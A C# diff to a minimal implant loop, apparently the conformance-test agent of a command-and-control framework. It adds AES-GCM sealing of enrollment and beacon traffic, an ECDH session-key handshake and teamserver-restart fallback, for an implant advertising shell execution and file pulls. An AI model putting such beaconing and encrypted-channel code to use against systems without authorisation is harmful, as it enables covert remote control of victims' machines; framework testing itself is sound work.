@@ -2,6 +2,9 @@ using System.Net.Http.Json;
 using System.Security.Cryptography;
 using System.Security.Cryptography.X509Certificates;
 using Google.Protobuf;
+using Rod.CoreState;
+using Rod.Transport.Endpoints;
+using Rod.Transport.Payloads;
 using Rod.V1;
 
 namespace Rod.Conformance;
@@ -15,6 +18,14 @@ namespace Rod.Conformance;
 /// example implant binary runs it once from the environment until killed.
 /// A past kill date returns before any contact -- the refusal the kill-date
 /// clause observes.
+///
+/// When the target carries an envelope key the loop runs the sealed
+/// posture with the session-key arm (architecture.md Sec 9): the enroll
+/// body seals under the baked key, the first contact offers an ephemeral
+/// P-256 public on its handshake and carries nothing else, and every body
+/// after the agreement seals under the HKDF-derived session keys -- the
+/// same arm the reference implants run. Without one it keeps the plaintext
+/// lab posture the Tier 0 clauses were built on.
 /// </summary>
 public sealed class MinimalImplantLoop(ImplantDefects defects)
 {
@@ -27,19 +38,42 @@ public sealed class MinimalImplantLoop(ImplantDefects defects)
     private readonly TaskNonceFloor _nonces = new();
     private bool _negotiated;
 
+    // The sealed posture's state: the baked seal the target named, the
+    // session keys once a handshake agreed them, and the contact counter
+    // the sealed body covers. Null baked keeps the plaintext lab posture.
+    private (Guid KeyId, byte[] Key)? _baked;
+    private (Guid SessionId, byte[] RequestKey, byte[] ResponseKey)? _session;
+    private long _counter;
+
     public async Task RunAsync(ConformanceTarget target, CancellationToken cancellationToken)
     {
         // Tier 1: refuse to start past the baked kill date.
         if (target.KillDate is { } killDate && killDate < DateTimeOffset.UtcNow)
             return;
 
+        _baked = target.EnvelopeKey is { } baked
+            && AesGcmEnvelope.TryUnbake(baked, out var bakedKeyId, out var bakedKey)
+            ? (bakedKeyId, bakedKey)
+            : null;
+
         // Tier 0, half one: generate the keypair, enroll the public half.
+        // The keyed posture seals the enroll body under the baked key (the
+        // JSON body wrapped in the R1 envelope, a JSON string of its base64).
         using var key = ECDsa.Create(ECCurve.NamedCurves.nistP256);
-        using var response = await _http.PostAsJsonAsync(target.EnrollUrl, new
+        var enrollJson = System.Text.Json.JsonSerializer.Serialize(new
         {
             deployTokenSecret = target.DeployToken,
             publicKey = Convert.ToBase64String(key.ExportSubjectPublicKeyInfo()),
-        }, cancellationToken);
+        });
+        HttpContent body = _baked is { } seal
+            ? new StringContent(
+                System.Text.Json.JsonSerializer.Serialize(
+                    AesGcmEnvelope.Wrap(
+                        System.Text.Encoding.UTF8.GetBytes(enrollJson), seal.KeyId, seal.Key, AesGcmEnvelope.Aad)),
+                System.Text.Encoding.UTF8,
+                "application/json")
+            : new StringContent(enrollJson, System.Text.Encoding.UTF8, "application/json");
+        using var response = await _http.PostAsync(target.EnrollUrl, body, cancellationToken);
         response.EnsureSuccessStatusCode();
         using var document = await System.Text.Json.JsonDocument.ParseAsync(
             await response.Content.ReadAsStreamAsync(cancellationToken), cancellationToken: cancellationToken);
@@ -80,6 +114,18 @@ public sealed class MinimalImplantLoop(ImplantDefects defects)
     {
         var outbound = new List<Frame>();
 
+        // The keyed posture's agreement contact: the offer rides the
+        // handshake and nothing else does, so the pending frames wait for
+        // the session it opens.
+        var agreeing = _baked is not null && _session is null;
+        byte[]? offered = null;
+        ECDiffieHellman? ephemeral = null;
+        if (agreeing)
+        {
+            ephemeral = ECDiffieHellman.Create(ECCurve.NamedCurves.nistP256);
+            offered = ExportPoint(ephemeral);
+        }
+
         // The defect variant speaks its result frame first; the server answers
         // an unspecified handshake status and closes, which is the point.
         if (_defects.SpeakHandshakeSecond)
@@ -91,29 +137,118 @@ public sealed class MinimalImplantLoop(ImplantDefects defects)
             });
         }
 
-        outbound.Add(new Frame
+        var handshake = new HandshakeRequest
         {
-            Payload = ByteString.CopyFrom(new HandshakeRequest
-            {
-                Version = new ProtocolVersion { Major = 1, Minor = 0 },
-                ImplantId = implantId,
-                Capabilities = { "shell.exec", "file.pull" },
-                ReplayNonces = true,
-            }.ToByteArray()),
-        });
-        outbound.AddRange(pending);
+            Version = new ProtocolVersion { Major = 1, Minor = 0 },
+            ImplantId = implantId,
+            Capabilities = { "shell.exec", "file.pull" },
+            ReplayNonces = true,
+        };
+        if (offered is not null)
+            handshake.SessionPublic = ByteString.CopyFrom(offered);
+        outbound.Add(new Frame { Payload = ByteString.CopyFrom(handshake.ToByteArray()) });
+        if (!agreeing)
+            outbound.AddRange(pending);
 
-        using var sent = await _http.PostAsync(
-            target.BeaconUrl,
-            new ByteArrayContent(Encode(outbound)), cancellationToken);
+        // The body: the session's R2 shape once keys are held, the baked
+        // key's R1 while agreeing, the plaintext frames in the lab posture.
+        // Every sealed body covers a fresh counter ahead of the frames.
+        var frames = Encode(outbound);
+        HttpContent content;
+        if (_session is { } session)
+        {
+            _counter++;
+            var plain = new byte[8 + frames.Length];
+            System.Buffers.Binary.BinaryPrimitives.WriteInt64BigEndian(plain, _counter);
+            frames.CopyTo(plain, 8);
+            content = new StringContent(
+                AesGcmEnvelope.WrapSession(plain, session.SessionId, session.RequestKey, AesGcmEnvelope.ContactRequestAad),
+                System.Text.Encoding.UTF8,
+                "text/plain");
+        }
+        else if (_baked is { } seal)
+        {
+            _counter++;
+            var plain = new byte[8 + frames.Length];
+            System.Buffers.Binary.BinaryPrimitives.WriteInt64BigEndian(plain, _counter);
+            frames.CopyTo(plain, 8);
+            content = new StringContent(
+                AesGcmEnvelope.Wrap(plain, seal.KeyId, seal.Key, AesGcmEnvelope.ContactRequestAad),
+                System.Text.Encoding.UTF8,
+                "text/plain");
+        }
+        else
+        {
+            content = new ByteArrayContent(frames);
+        }
+
+        using var sent = await _http.PostAsync(target.BeaconUrl, content, cancellationToken);
+
+        // A refused session body is the fallback signal: the keys it held no
+        // longer name a live agreement (a restarted teamserver), so the next
+        // cycle offers a fresh agreement under the baked key.
+        if ((int)sent.StatusCode == 401 && _session is not null)
+        {
+            _session = null;
+            ephemeral?.Dispose();
+            return pending;
+        }
         sent.EnsureSuccessStatusCode();
-        var inbound = Parse(await sent.Content.ReadAsByteArrayAsync(cancellationToken));
+
+        var responseBytes = await sent.Content.ReadAsByteArrayAsync(cancellationToken);
+        var responseText = System.Text.Encoding.UTF8.GetString(responseBytes).Trim();
+        byte[] plainBody;
+        if (_session is { } opened)
+            plainBody = AesGcmEnvelope.TryUnwrapSession(
+                responseText, opened.SessionId, opened.ResponseKey, AesGcmEnvelope.ContactResponseAad)
+                ?? throw new InvalidOperationException("The contact response did not open under the session key.");
+        else if (_baked is { } seal)
+            plainBody = AesGcmEnvelope.TryUnwrap(
+                responseText, seal.KeyId, seal.Key, AesGcmEnvelope.ContactResponseAad)
+                ?? throw new InvalidOperationException("The contact response did not open under the baked key.");
+        else
+            plainBody = responseBytes;
+
+        var inbound = Parse(plainBody);
         if (inbound.Count == 0)
-            return new List<Frame>();
-        var handshake = HandshakeResponse.Parser.ParseFrom(inbound[0].Payload);
-        if (handshake.Status != HandshakeStatus.Ok)
+        {
+            ephemeral?.Dispose();
+            return pending;
+        }
+        var handshakeAnswer = HandshakeResponse.Parser.ParseFrom(inbound[0].Payload);
+        if (handshakeAnswer.Status != HandshakeStatus.Ok)
+        {
+            ephemeral?.Dispose();
             return new List<Frame>(); // Every non-OK status is permanent: stop contacting.
-        _negotiated = handshake.ReplayNonces;
+        }
+        _negotiated = handshakeAnswer.ReplayNonces;
+
+        // The agreement's answer: derive the session keys from the echoed
+        // ephemeral and the baked key, and every body after this one runs
+        // under them. No echo keeps the baked-key seal (the negotiated-arm
+        // fallback an unupgraded server answers with).
+        if (agreeing && handshakeAnswer.SessionPublic.Length == SessionSealKeys.PublicKeyBytes)
+        {
+            using var server = ECDiffieHellman.Create();
+            var serverPoint = handshakeAnswer.SessionPublic.ToByteArray();
+            server.ImportParameters(new ECParameters
+            {
+                Curve = ECCurve.NamedCurves.nistP256,
+                Q = new ECPoint
+                {
+                    X = serverPoint.AsSpan(1, 32).ToArray(),
+                    Y = serverPoint.AsSpan(33, 32).ToArray(),
+                },
+            });
+            var shared = ephemeral!.DeriveRawSecretAgreement(server.PublicKey);
+            var seal = _baked!.Value;
+            var okm = SessionSealKeys.Derive(shared, seal.Key, seal.KeyId, new ImplantId(Guid.Parse(implantId)));
+            _session = (new Guid(okm.AsSpan(0, 16)), okm[16..48], okm[48..80]);
+        }
+        ephemeral?.Dispose();
+
+        if (agreeing)
+            return pending;
 
         var next = new List<Frame>();
         foreach (var frame in inbound.Skip(1))
@@ -156,6 +291,26 @@ public sealed class MinimalImplantLoop(ImplantDefects defects)
             });
         }
         return next;
+    }
+
+    // The uncompressed SEC1 point the session-key arm offers: 0x04 || X || Y,
+    // the export's coordinates right-aligned to the field size.
+    private static byte[] ExportPoint(ECDiffieHellman keys)
+    {
+        var point = keys.ExportParameters(includePrivateParameters: false).Q;
+        var encoded = new byte[SessionSealKeys.PublicKeyBytes];
+        encoded[0] = 0x04;
+        LeftAligned(point.X, encoded.AsSpan(1, 32));
+        LeftAligned(point.Y, encoded.AsSpan(33, 32));
+        return encoded;
+    }
+
+    private static void LeftAligned(byte[]? coordinate, Span<byte> slot)
+    {
+        if (coordinate is not { Length: > 0 })
+            return;
+        var source = coordinate.AsSpan(Math.Max(0, coordinate.Length - slot.Length));
+        source.CopyTo(slot.Slice(slot.Length - source.Length));
     }
 
     private static (Rod.V1.TaskOutcome Outcome, string Output) RunShell(string arguments)
